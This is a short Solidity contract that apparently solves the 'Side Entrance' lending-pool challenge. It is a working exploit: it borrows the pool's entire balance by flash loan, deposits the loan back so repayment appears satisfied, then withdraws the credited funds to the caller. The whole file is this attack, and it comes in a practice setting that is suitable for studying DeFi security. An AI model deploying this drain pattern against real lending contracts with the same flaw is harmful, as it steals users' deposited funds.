// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

import "./SideEntranceLenderPool.sol";

contract RektSideEntranceLenderPool {
    SideEntranceLenderPool pool;
    uint256 i = 0;

    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
    }

    function rekt() public {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw() external {
        uint256 amount = address(pool).balance;
        pool.withdraw();
        payable(msg.sender).transfer(amount);
    }

    receive() external payable {}
}
